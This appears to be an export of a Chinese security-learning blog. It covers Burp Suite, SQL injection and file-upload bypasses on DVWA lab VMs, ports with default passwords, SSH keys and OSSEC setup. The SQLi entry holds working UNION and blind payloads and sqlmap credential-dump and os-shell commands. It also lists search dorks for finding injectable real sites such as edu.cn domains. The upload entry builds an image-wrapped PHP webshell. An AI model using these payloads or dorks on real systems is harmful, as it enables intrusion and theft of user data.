    <content type="text"><![CDATA[功能以及特点123安全渗透界使用最广泛的漏扫工具之一，能实现从漏洞发现利用的完整过程。功能强大、配置较为复杂、可定制性高，支持丰富的第三方括展插件。基于Java编写，跨平台支持，分为Free和Professional版本https://portswigger.net/burp 123456789101112Target(目标) 目标模块用于设置扫描域(target scope)、生成站点地图(sitemap)、生成安全分析Proxy(代理) 拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流Spider(爬虫) 爬虫模块应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能，生成完整的网站地图 Scanner(扫描) 扫描模块用于自动化检测漏洞，分为主动和被动扫描 Intruder(入侵) 入侵模块根据上面检测到可能存在的漏洞链接(参数/变量)，调用本地词典、攻击载荷，对参数进行渗透测试Repeater(重放) 重发模块用于实现请求重放，通过修改参数进行手工请求回应的调试 Sequencer(序列器) 序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造 Decoder(解码器) 解码器模块进行手动执行或对应用程序数据者智能解码编码的工具(URL、HTML、Base64、ASCII、哈希等编码)Comparer(对比) 对比模块通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”，以此区分不同参数对结果造成的印象Extender(括展) 括展模块是burpsuite非常强悍的一个功能，也是它跟其他Web安全评估系统最大的差别，通过括展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能，通过burpsuite提供的API接口，目前可以支持JAVA、Python、Ruby三种语言的模块编写Options(选项) 分为Project/User Options,主要是对软件进行全局设置Alerts(警告) 显示软件的使用日志信息 Burp Suite使用开启监听端口123firefox插件FoxyProxy--监听本地8080端口 代理功能(Proxy)1站点地图 1设置过滤器 目标功能(Target) 爬虫功能(Spider)12345准备工作设置代理访问目标网站设置目标域拦截功能关闭 1爬虫选项 1执行爬虫：在站点地图中发送给爬虫 扫描功能(Scanner)123扫描选项之扫描方式：主动扫描精准度高时间长影响大消耗资源大被动扫描精准度低时间短影响小消耗资源小 1攻击插入点 1扫描选项 1漏洞说明 1漏洞问题 12345执行扫描:被动扫描默认开启被动，即在目标域下面手工浏览网页时，BurpSuite启动Passively scan进行扫描通过手工浏览网页+之前爬虫获得站点地图(包括详情页面)将这些已经存在的网页，发送到被动扫描模块 1执行扫描：主动扫描 1报告导出]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>工具</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入攻击及防御]]></title>
    <url>%2F2019%2F06%2F19%2F201942%2F</url>
    <content type="text"><![CDATA[123456在owasp年度top 10 安全问题中，注入高居榜首。SQL注入攻击指的是通过构建特殊的输入作为参数传入web应用程序，而在这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。- 对于web应用程序而言，用户核心数据存储在数据中，例如MySQL、SQL Server、Oracle、MSSQL等- 通过SQL注入攻击，可以获取、修改、删除数据库信息，并且通过提权来控制web服务器等其他操作- SQL注入即攻击者通过构造特殊的SQL语句，入侵目标系统，致使后台数据库泄露数据的过程- 因为SQL注入漏洞造成的严重危害性，所以常年稳居 OWASP TOP10的榜首！ 实验环境12目标靶机:OWASP_Broken_Web_Apps_VM_1.2IP：192.168.203.22 12测试渗透机：kali-linux-2018-4-vm-amd64IP：192.168.203.19 SQL注入危害 拖库导致用户数据泄露 危害web等应用的安全 失去操作系统的控制权 用户信息被非法买卖 危害企业及国家的安全 SQL基础(查)查看数据库1mysql&gt; SHOW DATABASES; 查看数据库版本1mysql&gt; SELECT VERSION(); 查看当前库1mysql&gt; SELECT DATABASE(); 查看当前用户1mysql&gt; SELECT USER(); 查看当前时间1mysql&gt; SELECT NOW(); 选择数据库12mysql&gt; USE dvwa; //dvwa为你要选择的数据库名 查看库中的表1mysql&gt; SHOW TABLES; 查看表结构123mysql&gt; DESCRIBE users;或mysql&gt; DESC users; 查看表的详细属性1mysql&gt; SHOW CREATE TABLE USERS\G 查看表记录123mysql&gt; SELECT * FROM USERS;// * 代表所有字段（可以指定字段）// USERS代表要查询表 12其他库 mysql.usermysql&gt; SELECT user,password,host FROM mysql.user ; 1234WHERE条件查询 mysql&gt; SELECT user,password,host FROM mysql.user WHERE user='root';mysql&gt; SELECT user,password,host FROM mysql.user WHERE user='root' and host='localhost';mysql&gt; SELECT user,password,host FROM mysql.user WHERE user='root' or host='localhost'; infomation_schema表123INFORMATION_SCHEMA提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 12//查看数据库库名、表名mysql&gt; SELECT * FROM information_schema.TABLES\G 12//查看数据库库名、表名、字段名mysql&gt; SELECT * FROM information_schema.columns\G 123mysql&gt; SELECT DISTINCT TABLE_SCHEMA FROM information_schema.TABLES;//DISTINCT 去重//等同于 SHOW DATABASES; 12mysql&gt; SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='dvwa';//等同于 SHOW TABLES; SQL注入流程 判断是否存在SQL注入漏洞 判断操作系统、数据库和web应用的类型 获取数据库信息，包括管理员信息以及拖库 加密信息破解，sqlmap可自动破解 提升权限，获得sql-shell、os-shell、登录应用后台 手动注入实战（基础）基于错误的注入123错误注入的思路是通过构造特殊的SQL语句，根据得到的错误信息，确认SQL注入点；通过数据库报错信息，也可以探测到数据库的类型和其他有用信息;通过输入单引号，触发数据库异常，通过异常日志诊断数据库类型; 从查看源代码文件在低安全模式下，没有做安全过滤：直接将获取到的值代入数据库语句当前所使用的库为dvwa搜索框正常输入112生成的sql语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users where user_id='1'; 搜索框输入单引号’，报出语法错误说明了它能够接受单引号(没有过滤)，只是试探性的试试看是否存在注入点12生成的sql语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users where user_id='''; 12页面报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1 基于布尔的注入1布尔逻辑注入的思路是闭合SQL语句、构造or和and逻辑语句、注释多余的代码； 123456789原始语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users where user_id='$id';SQL注入语句：' or 1 = 1 -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id='' or 1 = 1 -- ''说明：第一个单引号' 用于闭合前面的语句(条件)or 1 = 1 代表为真的条件-- 将注释后面的语句 基于UNION注入12UNION语句用于联合前面的SELECT查询语句，合并查询更多信息；一般通过错误和布尔注入确认注入点之后，便开始通过union语句来获取有效信息 12345678910111213141516171819202122232425262728293031323334353637383940//猜测数据列数' UNION SELECT 1 -- '' UNION SELECT 1,2 -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT 1 -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT 1,2 -- ''//获得当前数据库及用户信息'UNION SELECT VERSION(), DATABASE() -- ''UNION SELECT USER(), DATABASE() -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT VERSION(),DATABASE() -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT USER(),DATABASE() -- ''说明：VERSION() 获取数据库版本信息DATABASE() 获取当前数据库名USER() 获取当前用户名//查询数据中的所有表information_schema数据库是MySQL自带的，它提供了数据元数据的访问方式。元数据包括数据的库名、表名、列数据类型、访问权限、字符集等基础信息。网站注入时，MySQL 5.0以上以及5.0一下的区别？5.0以下没有information_schema5.0以下是多用户单操作，5.0以上是多用户多操做。SQL注入语句解析：mysql&gt; SELECT * FROM INFORMATION_SCHEMA.TABLES\G//查询所有库名'UNION SELECT TABLE_SCHEMA,1 FROM INFORMATION_SCHEMA.tables -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT TABLE_SCHEMA,1 FROM INFORMATION_SCHEMA.tables -- ''//查询所库中所有表名'UNION SELECT table_name,1 FROM INFORMATION_SCHEMA.tables -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT table_name,1 FROM INFORMATION_SCHEMA.tables -- ''//同时查询表名以及对应库名'UNION SELECT TABLE_SCHEMA,table_name FROM INFORMATION_SCHEMA.tables -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT TABLE_SCHEMA,table_name FROM INFORMATION_SCHEMA.tables -- '' 123456789101112131415161718192021222324原始语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users where user_id='$id';//查询数据表'UNION SELECT column_name,1 FROM INFORMATION_SCHEMA.columns WHERE table_name='users' -- ''UNION SELECT column_name,1 FROM INFORMATION_SCHEMA.columns WHERE table_name='USER_PRIVILEGES' -- ''UNION SELECT column_name,1 FROM INFORMATION_SCHEMA.columns WHERE table_name='SCHEMA_PRIVILEGES' -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT column_name,1 from INFORMATION_SCHEMA.columns WHERE table_name='users' -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT column_name,1 from INFORMATION_SCHEMA.columns WHERE table_name='USER_PRIVILEGES' -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT column_name,1 from INFORMATION_SCHEMA.columns WHERE table_name='SCHEMA_PRIVILEGES' -- ''//查询数据列'UNION SELECT NULL, user FROM users -- ''UNION SELECT NULL, password FROM usedrs -- ''UNION SELECT user, password FROM users -- ''UNION SELECT password, concat(first_name,' ' ,last_name,' ',user) FROM users -- '生成的SQL语句：mysql&gt; use dvwa;mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT NULL, user FROM users -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT NULL, password FROM users -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT user, password FROM users -- ''mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id=''UNION SELECT password, concat(first_name,' ' ,last_name,' ',user) FROM users -- ''说明：concat() 将多个字符串连接成一个字符串。group_concat() 该函数返回带有来自一个组的连接的非NULL值的字符串结果。 基于时间的盲注1有些数据库错误做了安全配置,使得无法通过以上方式探测到注入点，此时，通过设置sleep()函数来探测注入点。 123456//sleep()函数1' and sleep(5) -- '生成的SQL语句：mysql&gt; SELECT first_name,last_name FROM dvwa.users WHERE user_id='1' and sleep(5) -- ''说明：sleep() 让sql执行的时候sleep(pause)一段时间。 SQLmap自动化注入（基础） SQL注入比较好用的工具，首推开源工具SQLmap。SQLmap是一个国内外著名的安全稳定性测试工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器权限。它具有功能强大的检测引擎，针对各种不同类型数据库的安全稳定性测试功能选项，包括获取数据中存储的数据，访问操作文件甚至可以通过外带数据连接方式执行操作系统命令。SQLmap支持MySQL,Oracle,PostgreSQL,Microsoft,SQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。 常见参数及语句解析1234567891011121314151617181920212223242526272829--batch 批处理(自动化完成)--level 等级--risk 风险--dbms 指定数据库类型--proxy=PROXY 指定代理--dbs 获取所有数据库--users 获取用户--current-db 获取当前数据库--current-user 当前用户--sql--shell 创建一个sql的shell--os-shell 创建一个对方操作系统的shell，远程执行系统命令--os-cmd=OSCMD 执行一句系统命令--cookie=COOKIE 指定测试时使用的cookie，通常在一些需要登录的站点会使用--dump-all 查询全部数据--dump-all --exclude-sysdbs 查询全部数据，排除系统库-h 查看帮助-hh 查看全部帮助–data=DATA 通过POST发送的数据字符串–smart 有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。-p 指定某个参数-u 指定url-x 站点地图，提交给sql一个xml文件-r 可以将一个post请求方式的数据包保存在一个txt中，sqlmap会通过post方式检测目标-g 使用google引擎搜索类似的网址，并且多目标检测-D "database_name" --tables 获取某个库里的表数据 -D "database_name" -T "table_name" --columns 某个库某个表的列信息-D "database_name" -T "table_name" --dump 查询指定某个库某个表里全部数据-D "database_name" -T "table_name" -C "username,password" --dump 查询指定字段数据... 示例步骤：1root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" -p username --batch 12//获取所有数据库root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" -p username --batch --dbs 12//获取当前数据库root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" --batch --current-db 12//获取当前用户root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" --batch --current-user 12//获取数据库表root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" --batch -D 'nowasp' --tables 12//获取表的字段root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" --batch -D 'nowasp' -T 'accounts' --columns 12//获取表中数据root@kali:~# sqlmap -u "http://192.168.203.22/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=admin&amp;user-info-php-submit-button=View+Account+Details" --batch -D 'nowasp' -T 'accounts' -C 'username,password' --dump 需要带cookie才能访问的注入页面,–cookie=”” Cookie：Cookie意为“甜饼”，是由W3C组织提出，最早由Netscape社区发展的一种机制。目前Cookie已经成为标准，所有的主流浏览器如IE、Netscape、Firefox、Opera等都支持Cookie。由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。 示例步骤： 获取cookie（firefox插件：Cookies Quick Manager、Cookiebro等）1@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" 12获取当前数据库root@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" --current-db 12//获取数据库表root@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" -D 'dvwa' --tables 1root@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" -D 'dvwa' -T 'users' --columns 1root@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" -D 'dvwa' -T 'users' -C 'user,password' --dump 权限提升12//与数据库交互 --sql-shellroot@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" --sql-shell 1sql-shell&gt; select * from users; 12345678//与操作系统交互--os-shell、需要一定的条件,否则无法创建os-shell需要一定的条件： 网站必须是root权限 # --is-dba 攻击者需要知道网站的绝对路径 # 可以利用SQL语言查看@@datadir GPC为off，php主动转义的功能关闭# php.ini文件 secure_file_priv为空白 #查询select @@secure_file_privroot@kali:~# sqlmap -u "http://192.168.203.22/dvwa/vulnerabilities/sqli/?id=111&amp;Submit=Submit#" --batch --cookie "PHPSESSID=0sctqa3r895dnmb4f9vt4r14s1;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada;showhints=1" --os-shell 提示失败 实例 通过Google搜索可能存在注入的页面 inurl:.php?id= inurl:.jsp?id= inurl:.asp?id= inurl:/admin/login.php inurl:.php?id= intitle:美女 通过百度搜索可能在的注入页面 inurl:news.asp?id= site:edu.cn inurl:news.php?id= site:edu.cn inurl:news.aspx?id= site:edu.cn]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL注入</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网信息收集]]></title>
    <url>%2F2019%2F06%2F19%2F201941%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565721 ftp 22 SSH 23 Telnet 25 SMTP 53 DNS 69 TFTP 80 web 80-89 web 110 POP3 135 RPC 139 NETBIOS 143 IMAP 161 SNMP 389 LDAP 443 SSL心脏滴血以及一些web漏洞测试 445 SMB 512,513,514 Rexec 873 Rsync未授权 1025,111 NFS 1080 socks 1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 1433 MSSQL (暴力破解) 1521 Oracle:(iSqlPlus Port:5560,7778) 2082/2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601,2604 zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3306 MySQL （暴力破解） 3312/3311 kangle主机管理系统登陆 3389 远程桌面 3690 svn 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 4848 GlassFish web中间件 弱口令:admin/adminadmin 5432 PostgreSQL 5900 vnc 5984 CouchDB http://xxx:5984/_utils/ 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 7778 Kloxo主机控制面板登录 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080 tomcat/WDCd/ 主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8081 Symantec AV/Filter for MSE 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9000 fcgi fcig php执行 9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50060 hadoop 50070,50030 hadoop默认端口未授权访问]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞原理]]></title>
    <url>%2F2019%2F03%2F30%2F201940%2F</url>
    <content type="text"><![CDATA[实验环境12345目标靶机:OWASP_Broken_Web_Apps_VM_1.2IP:192.168.0.109测试渗透机：kali-linux-2018-4-vm-amd64IP:192.168.0.103 文件上传原理123451、文件上传（File Upload）是大部分web应用都具备的功能，如：用户上传的附件、修改头像、分享图片/视频等2、正常的文件一般是文档、图片、视频等，web应用收集之后放入后台存储，需要的时候调用出来返回3、如果恶意的文件如PHP、ASP等执行文件绕过web应用，并顺利执行，则相当于黑客直接拿到webshell4、一旦黑客拿到webshell，则可以拿到web应用的数据，删除web文件，本地提权，进一步拿下整个服务器甚至内网5、SQL注入攻击的对象是数据库服务，文件上传漏洞主要攻击web服务，实际渗透两种相结合，达到对目标的深度控制 实验实验一（low）进入靶机环境这里提示选择你要上传的图像，我们上传一张jpg图片文件提示上传成功，我们查看一下再次尝试上传一个11.txt的文本文件，看是否限制上传提示上传成功，我们查看一下此时我们上传一个一句话木马的PHP可执行文件，看是否限制上传提示成功上传，我们查看一下此时亮出我们的中国菜刀成功进入我们来分析下靶机源码12345678910111213141516171819202122 &lt;?php if (isset($_POST['Upload'])) &#123; //判断是否有post提交过来的变量 $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; //设置上传目录 $target_path = $target_path . basename( $_FILES['uploaded']['name']); //获取上传文件名 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //将上传的文件移动到新位置 echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; 12低安全模式下没有验证文件上传类型，后缀名，可以任意上传文件及文件大小 实验二（medium）进入靶机环境上传一张jpg图片文件，成功上传上传一个PHP可执行文件，提示Your image was not uploaded.我们来分析下靶机源码1234567891011121314151617181920212223242526272829303132&lt;?php if (isset($_POST['Upload'])) &#123; //判断是否有post提交过来的变量 $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; //设置上传目录 $target_path = $target_path . basename($_FILES['uploaded']['name']); //获取上传文件名 $uploaded_name = $_FILES['uploaded']['name']; //客户端文件的原名称 $uploaded_type = $_FILES['uploaded']['type']; //文件的MIME类型 $uploaded_size = $_FILES['uploaded']['size']; //已上传文件的字节大小 if (($uploaded_type == "image/jpeg") &amp;&amp; ($uploaded_size &lt; 100000))&#123; //进行了一个MIME类型及文件大小判断 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //将上传的文件移动到新位置 echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125; else&#123; echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; &#125; ?&gt; 12中安全模式下对文件上传的MIME类型及大小进行了一个判断 此时，我们可以用burp suite抓包来做一个对比利用burp suite抓包进行修改Content-Type值为imge/jpeg进行上传上菜刀 实验三（high）尝试上述方法，全部失败，不在赘述查看靶机源码12345678910111213141516171819202122232425262728293031323334353637 &lt;?phpif (isset($_POST['Upload'])) &#123; //判断是否有post提交过来的变量 $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; //设置上传目录 $target_path = $target_path . basename($_FILES['uploaded']['name']); //获取上传文件名 $uploaded_name = $_FILES['uploaded']['name']; //客户端文件的原名称($_FILES['file']['name']在得到文件名时0x00【%00截断】之后的内容已经不见了，如果在此基础上判断后缀名是否合法，则肯定不能通过。) $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); //取文件最后的扩展名 $uploaded_size = $_FILES['uploaded']['size']; //已上传文件的字节大小 if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") &amp;&amp; ($uploaded_size &lt; 100000))&#123; //采取白名单方式验证文件的后缀名以及文件大小 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //将上传的文件移动到新位置 echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125; else&#123; echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; 12高安全模式下后台检测上传文件后缀名(采取白名单) 这里我们结合文件包含漏洞使用dos命令制作一句话图片木马123copy shell.jpg /b+ xiaowei.php shell3.jpg--/b 以二进制的形式进行复制、合并文件。--/a 以ASCII的形式进行复制、合并文件。 将制作好的一句话图片木马进行上传结合文件包含漏洞，直接包含该文件会将该文件以PHP来运行：上菜刀此时，你可能会遇到这样子的问题 （根据排查初步断定菜刀没有进行一个身份认证，导致返回了一个200状态码的，一个登陆界面源码）此时我们利用菜刀的浏览器登陆下我们的靶机环境，让它产生cookie我们再次进行我们的一句话连接]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>WEB</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习笔记]]></title>
    <url>%2F2019%2F03%2F18%2F201939%2F</url>
    <content type="text"><![CDATA[一款挺好的在线创作的思维导图、流程图等https://www.processon.com/i/5c09c763e4b0ca4b40cae793 PNG格式http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.pngPDF格式链接： https://pan.baidu.com/s/13Tbkr67sSZltMQ6d6f2YoA提取码： on0o]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>思维导图</tag>
        <tag>笔记</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh基于密钥认证登陆]]></title>
    <url>%2F2019%2F03%2F12%2F201938%2F</url>
    <content type="text"><![CDATA[基于密钥的认证 系统环境OS:centos7 连接工具：xshell IP:192.168.0.120 生成ssh认证的私钥和公钥1ssh-keygen 将公钥制作成key1mv id_rsa.pub authorized_keys 将私钥下载到本地 编辑配置文件允许公钥认证，关闭口令认证 重启ssh服务1service sshd restart 利用密钥进行连接]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Centos7</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OSSEC安装部署]]></title>
    <url>%2F2019%2F03%2F12%2F201937%2F</url>
    <content type="text"><![CDATA[概述OSSEC是一款开源的多平台的入侵检测系统，可以运行于Windows, Linux, OpenBSD/FreeBSD, 以及 MacOS等操作系统中。包括了日志分析，全面检测，root-kit检测，实时报警以及联动响应等功能。 系统环境服务端(server)OS:Centos7 IP:192.168.0.120 客户端1(agent1)OS:Centos7 IP:192.168.0.110 客户端2(agent2)OS:Microsoft Windows 10 Education IP:192.168.0.102 OSSEC服务端环境部署更换软件安装源Centos7更换软件安装源：https://axiaowei.cn/2019/03/12/201936/#more 关闭内置安全子系统123456# 临时关闭，立即生效。（重启失效）setenforce 0# 修改配置文件，重启后生效。vi /etc/sysconfig/selinux将SELINUX=enforcing修改为SELINUX=disabled 关闭防火墙(firewall)注意:如果这里需要开启防火墙需要放行相对应的端口1234# 停止firewalldsystemctl stop firewalld# 禁止开机自启systemctl disable firewalld 安装关联的库以及软件数据库以及支持库安装12yum install mariadb-server -yyum install mariadb-devel -y 具体内容可参考官方文档：https://mariadb.com/kb/en/library/about-the-mariadb-rpm-files/ 数据库配置1234# 启动数据库systemctl start mariadb# 设置mariadb开机自启systemctl enable mariadb 运行mysql_secure_installation执行几个设置:–为root用户设置密码–删除匿名账号–取消root用户的远程登陆–删除test库–刷新授权使其修改生效 1234567891011121314mysql_secure_installationEnter current password for root (enter for none):&lt;–初次运行直接回车Set root password? [Y/n] #是否设置root用户密码，输入y并回车或直接回车New password: #设置root用户的密码Re-enter new password: #再输入一次你设置的密码Remove anonymous users? [Y/n] #是否删除匿名用户Disallow root login remotely? [Y/n] #是否禁止root远程登录,根据自己的需求选择Y/n并回车,建议禁止Remove test database and access to it? [Y/n] #是否删除test数据库Reload privilege tables now? [Y/n] #是否重新加载权限表 登陆数据库，创建ossec库1234# 创建库create database ossec;# 查看数据库show databases; 创建ossec用户，密码为ossec，并给予ossec数据库的所有权限123456789# all privileges 表示所有权限授予给用户# on 表示这些权限对哪些数据库和表生效,格式：数据库名.表名（这里写"*",表示所有数据库,所有表）# to 将权限授予哪个用户。格式："用户名"@"登录IP或域名"。"%"表示没有限制,在任何主机都可以登录。# identified by 指定用户的登陆密码grant all privileges on ossec.* to 'ossec'@'%' identified by 'ossec';# 刷新权限flush privileges; 安装gcc*、sedmail、apache、php、php-mysql、wget由于我们需要把日志导入到mysql中进行分析，以及需要第三方web界面用来显示报警信息，同时需要本机当作SMTP，所以需要在本机安装mysql、apache和sendmail服务。1yum install -y php php-mysql httpd gcc* wget sendmail 开启相应的服务123456#启动httpd服务systemctl start httpd#查看httpd服务状态systemctl status httpd#设置httpd服务开机自启systemctl enable httpd 123456#启动sendmail服务systemctl start sendmail#查看sendmail服务状态systemctl status sendmail#设置sendmail服务开机自启systemctl status sendmail 下载OSSEC，并解压1234# 下载OSSECwget https://github.com/alixiaowei/ossec/blob/master/ossec-hids-2.8.1.tar.gz?raw=true# 解压tar -xzf ossec-hids-2.8.1.tar.gz\?raw\=true 为了使OSSEC支持Mysql,安装之前在src目录下执行make setdb1cd ossec-hids-2.8.1/src/ &amp;&amp; make setdb 提示Info: Compiled with MySQL support. 说明可以正常支持mysql 安装OSSEC服务端12[root@Server ~]# cd ossec-hids-2.8.1[root@Server ossec-hids-2.8.1]# ./install.sh 